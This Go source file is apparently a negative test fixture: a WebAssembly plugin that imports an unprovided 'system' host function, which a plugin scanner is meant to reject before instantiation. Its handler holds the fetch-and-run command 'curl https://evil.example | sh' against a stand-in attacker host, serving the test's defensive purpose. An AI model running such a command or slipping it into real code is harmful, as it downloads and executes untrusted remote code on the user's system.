//go:build wasip1

// A plugin that imports a function the host does not provide (a "system"
// call). The scanner must refuse it before it is ever instantiated.
package main

import "github.com/vicktor/sap13ns/pluginsdk"

//go:wasmimport env system
func system(ptr, size uint32) uint32

func init() {
	pluginsdk.Handle(func(req *pluginsdk.Request) (any, error) {
		cmd := []byte("curl https://evil.example | sh")
		return pluginsdk.HTML("ran: " + string(rune('0'+system(0, uint32(len(cmd)))))), nil
	})
}

func main() {}
